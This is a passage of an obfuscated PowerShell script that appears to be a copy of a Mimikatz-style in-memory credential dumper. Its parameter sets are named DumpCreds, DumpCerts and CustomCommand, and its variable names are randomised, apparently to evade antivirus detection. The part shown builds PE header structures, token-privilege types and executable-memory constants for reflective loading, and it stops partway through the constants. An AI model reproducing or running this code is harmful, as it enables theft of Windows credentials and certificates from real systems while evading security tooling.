function doable
{
[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$hfhMDefS99,
    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $CELrsSGQ99,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $CpzaPhsf99,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
$PvzjYTDP99 = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$zeBVCOaZ99,
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$CnXqNcNq99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$vwUWdArF99,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$RUiYbjPF99,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$DvWuUDKk99,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $vamjTknO99
	)
	
	Function stroked
	{
		$DIEZeRqh99 = New-Object System.Object
		$IIxpTQJc99 = [AppDomain]::CurrentDomain
		$TWBShied99 = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$cmfciYgp99 = $IIxpTQJc99.DefineDynamicAssembly($TWBShied99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$lFEziVqC99 = $cmfciYgp99.DefineDynamicModule('DynamicModule', $false)
		$BiZBqtcG99 = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$JfxRdmvb99 = $lFEziVqC99.DefineEnum('MachineType', 'Public', [UInt16])
		$JfxRdmvb99.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$JfxRdmvb99.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$JfxRdmvb99.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$JfxRdmvb99.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$ZOZqpndx99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name MachineType -Value $ZOZqpndx99
		$JfxRdmvb99 = $lFEziVqC99.DefineEnum('MagicType', 'Public', [UInt16])
		$JfxRdmvb99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$srAQgfno99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name MagicType -Value $srAQgfno99
		$JfxRdmvb99 = $lFEziVqC99.DefineEnum('SubSystemType', 'Public', [UInt16])
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$xdESlxtf99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $xdESlxtf99
		$JfxRdmvb99 = $lFEziVqC99.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$JfxRdmvb99.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$JfxRdmvb99.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$JfxRdmvb99.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$JfxRdmvb99.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$JfxRdmvb99.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$JfxRdmvb99.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$cVUcAckb99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $cVUcAckb99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_DATA_DIRECTORY', $yhlgLXvH99, [System.ValueType], 8)
		($JfxRdmvb99.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($JfxRdmvb99.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$VVTOZHvL99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $VVTOZHvL99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_FILE_HEADER', $yhlgLXvH99, [System.ValueType], 20)
		$JfxRdmvb99.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$SPcfXGDa99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $SPcfXGDa99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_OPTIONAL_HEADER64', $yhlgLXvH99, [System.ValueType], 240)
		($JfxRdmvb99.DefineField('Magic', $srAQgfno99, 'Public')).SetOffset(0) | Out-Null
		($JfxRdmvb99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($JfxRdmvb99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($JfxRdmvb99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($JfxRdmvb99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($JfxRdmvb99.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($JfxRdmvb99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($JfxRdmvb99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($JfxRdmvb99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($JfxRdmvb99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($JfxRdmvb99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($JfxRdmvb99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($JfxRdmvb99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($JfxRdmvb99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($JfxRdmvb99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($JfxRdmvb99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($JfxRdmvb99.DefineField('Subsystem', $xdESlxtf99, 'Public')).SetOffset(68) | Out-Null
		($JfxRdmvb99.DefineField('DllCharacteristics', $cVUcAckb99, 'Public')).SetOffset(70) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($JfxRdmvb99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($JfxRdmvb99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($JfxRdmvb99.DefineField('ExportTable', $VVTOZHvL99, 'Public')).SetOffset(112) | Out-Null
		($JfxRdmvb99.DefineField('ImportTable', $VVTOZHvL99, 'Public')).SetOffset(120) | Out-Null
		($JfxRdmvb99.DefineField('ResourceTable', $VVTOZHvL99, 'Public')).SetOffset(128) | Out-Null
		($JfxRdmvb99.DefineField('ExceptionTable', $VVTOZHvL99, 'Public')).SetOffset(136) | Out-Null
		($JfxRdmvb99.DefineField('CertificateTable', $VVTOZHvL99, 'Public')).SetOffset(144) | Out-Null
		($JfxRdmvb99.DefineField('BaseRelocationTable', $VVTOZHvL99, 'Public')).SetOffset(152) | Out-Null
		($JfxRdmvb99.DefineField('Debug', $VVTOZHvL99, 'Public')).SetOffset(160) | Out-Null
		($JfxRdmvb99.DefineField('Architecture', $VVTOZHvL99, 'Public')).SetOffset(168) | Out-Null
		($JfxRdmvb99.DefineField('GlobalPtr', $VVTOZHvL99, 'Public')).SetOffset(176) | Out-Null
		($JfxRdmvb99.DefineField('TLSTable', $VVTOZHvL99, 'Public')).SetOffset(184) | Out-Null
		($JfxRdmvb99.DefineField('LoadConfigTable', $VVTOZHvL99, 'Public')).SetOffset(192) | Out-Null
		($JfxRdmvb99.DefineField('BoundImport', $VVTOZHvL99, 'Public')).SetOffset(200) | Out-Null
		($JfxRdmvb99.DefineField('IAT', $VVTOZHvL99, 'Public')).SetOffset(208) | Out-Null
		($JfxRdmvb99.DefineField('DelayImportDescriptor', $VVTOZHvL99, 'Public')).SetOffset(216) | Out-Null
		($JfxRdmvb99.DefineField('CLRRuntimeHeader', $VVTOZHvL99, 'Public')).SetOffset(224) | Out-Null
		($JfxRdmvb99.DefineField('Reserved', $VVTOZHvL99, 'Public')).SetOffset(232) | Out-Null
		$QKvvqnAB99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $QKvvqnAB99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_OPTIONAL_HEADER32', $yhlgLXvH99, [System.ValueType], 224)
		($JfxRdmvb99.DefineField('Magic', $srAQgfno99, 'Public')).SetOffset(0) | Out-Null
		($JfxRdmvb99.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($JfxRdmvb99.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($JfxRdmvb99.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($JfxRdmvb99.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($JfxRdmvb99.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($JfxRdmvb99.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($JfxRdmvb99.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($JfxRdmvb99.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($JfxRdmvb99.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($JfxRdmvb99.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($JfxRdmvb99.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($JfxRdmvb99.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($JfxRdmvb99.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($JfxRdmvb99.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($JfxRdmvb99.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($JfxRdmvb99.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($JfxRdmvb99.DefineField('Subsystem', $xdESlxtf99, 'Public')).SetOffset(68) | Out-Null
		($JfxRdmvb99.DefineField('DllCharacteristics', $cVUcAckb99, 'Public')).SetOffset(70) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($JfxRdmvb99.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($JfxRdmvb99.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($JfxRdmvb99.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($JfxRdmvb99.DefineField('ExportTable', $VVTOZHvL99, 'Public')).SetOffset(96) | Out-Null
		($JfxRdmvb99.DefineField('ImportTable', $VVTOZHvL99, 'Public')).SetOffset(104) | Out-Null
		($JfxRdmvb99.DefineField('ResourceTable', $VVTOZHvL99, 'Public')).SetOffset(112) | Out-Null
		($JfxRdmvb99.DefineField('ExceptionTable', $VVTOZHvL99, 'Public')).SetOffset(120) | Out-Null
		($JfxRdmvb99.DefineField('CertificateTable', $VVTOZHvL99, 'Public')).SetOffset(128) | Out-Null
		($JfxRdmvb99.DefineField('BaseRelocationTable', $VVTOZHvL99, 'Public')).SetOffset(136) | Out-Null
		($JfxRdmvb99.DefineField('Debug', $VVTOZHvL99, 'Public')).SetOffset(144) | Out-Null
		($JfxRdmvb99.DefineField('Architecture', $VVTOZHvL99, 'Public')).SetOffset(152) | Out-Null
		($JfxRdmvb99.DefineField('GlobalPtr', $VVTOZHvL99, 'Public')).SetOffset(160) | Out-Null
		($JfxRdmvb99.DefineField('TLSTable', $VVTOZHvL99, 'Public')).SetOffset(168) | Out-Null
		($JfxRdmvb99.DefineField('LoadConfigTable', $VVTOZHvL99, 'Public')).SetOffset(176) | Out-Null
		($JfxRdmvb99.DefineField('BoundImport', $VVTOZHvL99, 'Public')).SetOffset(184) | Out-Null
		($JfxRdmvb99.DefineField('IAT', $VVTOZHvL99, 'Public')).SetOffset(192) | Out-Null
		($JfxRdmvb99.DefineField('DelayImportDescriptor', $VVTOZHvL99, 'Public')).SetOffset(200) | Out-Null
		($JfxRdmvb99.DefineField('CLRRuntimeHeader', $VVTOZHvL99, 'Public')).SetOffset(208) | Out-Null
		($JfxRdmvb99.DefineField('Reserved', $VVTOZHvL99, 'Public')).SetOffset(216) | Out-Null
		$GiDwptEe99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $GiDwptEe99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_NT_HEADERS64', $yhlgLXvH99, [System.ValueType], 264)
		$JfxRdmvb99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('FileHeader', $SPcfXGDa99, 'Public') | Out-Null
		$JfxRdmvb99.DefineField('OptionalHeader', $QKvvqnAB99, 'Public') | Out-Null
		$TwucjvVu99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $TwucjvVu99
		
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_NT_HEADERS32', $yhlgLXvH99, [System.ValueType], 248)
		$JfxRdmvb99.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('FileHeader', $SPcfXGDa99, 'Public') | Out-Null
		$JfxRdmvb99.DefineField('OptionalHeader', $GiDwptEe99, 'Public') | Out-Null
		$tECCXNNa99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $tECCXNNa99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_DOS_HEADER', $yhlgLXvH99, [System.ValueType], 64)
		$JfxRdmvb99.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$EueLBtuL99 = $JfxRdmvb99.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$giANOGal99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$iWRlgvKQ99 = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$NSXPtVQb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($BiZBqtcG99, $giANOGal99, $iWRlgvKQ99, @([Int32] 4))
		$EueLBtuL99.SetCustomAttribute($NSXPtVQb99)
		$JfxRdmvb99.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$sNmxhbNL99 = $JfxRdmvb99.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$giANOGal99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$NSXPtVQb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($BiZBqtcG99, $giANOGal99, $iWRlgvKQ99, @([Int32] 10))
		$sNmxhbNL99.SetCustomAttribute($NSXPtVQb99)
		$JfxRdmvb99.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$BDEFVBKL99 = $JfxRdmvb99.CreateType()	
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $BDEFVBKL99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_SECTION_HEADER', $yhlgLXvH99, [System.ValueType], 40)
		$ZvTqIFYA99 = $JfxRdmvb99.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$giANOGal99 = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$NSXPtVQb99 = New-Object System.Reflection.Emit.CustomAttributeBuilder($BiZBqtcG99, $giANOGal99, $iWRlgvKQ99, @([Int32] 8))
		$ZvTqIFYA99.SetCustomAttribute($NSXPtVQb99)
		$JfxRdmvb99.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$ZFVGUzPg99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $ZFVGUzPg99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_BASE_RELOCATION', $yhlgLXvH99, [System.ValueType], 8)
		$JfxRdmvb99.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$GCPrQKYR99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $GCPrQKYR99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_IMPORT_DESCRIPTOR', $yhlgLXvH99, [System.ValueType], 20)
		$JfxRdmvb99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$YdHEBPlv99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $YdHEBPlv99
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('IMAGE_EXPORT_DIRECTORY', $yhlgLXvH99, [System.ValueType], 40)
		$JfxRdmvb99.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Name', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Base', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$YwuPxgiH99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $YwuPxgiH99
		
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('LUID', $yhlgLXvH99, [System.ValueType], 8)
		$JfxRdmvb99.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('LUID_AND_ATTRIBUTES', $yhlgLXvH99, [System.ValueType], 12)
		$JfxRdmvb99.DefineField('Luid', $LUID, 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$VNETAlif99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $VNETAlif99
		
		$yhlgLXvH99 = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$JfxRdmvb99 = $lFEziVqC99.DefineType('TOKEN_PRIVILEGES', $yhlgLXvH99, [System.ValueType], 16)
		$JfxRdmvb99.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$JfxRdmvb99.DefineField('Privileges', $VNETAlif99, 'Public') | Out-Null
		$aPMuKAwF99 = $JfxRdmvb99.CreateType()
		$DIEZeRqh99 | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $aPMuKAwF99
		return $DIEZeRqh99
	}
	Function toed
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
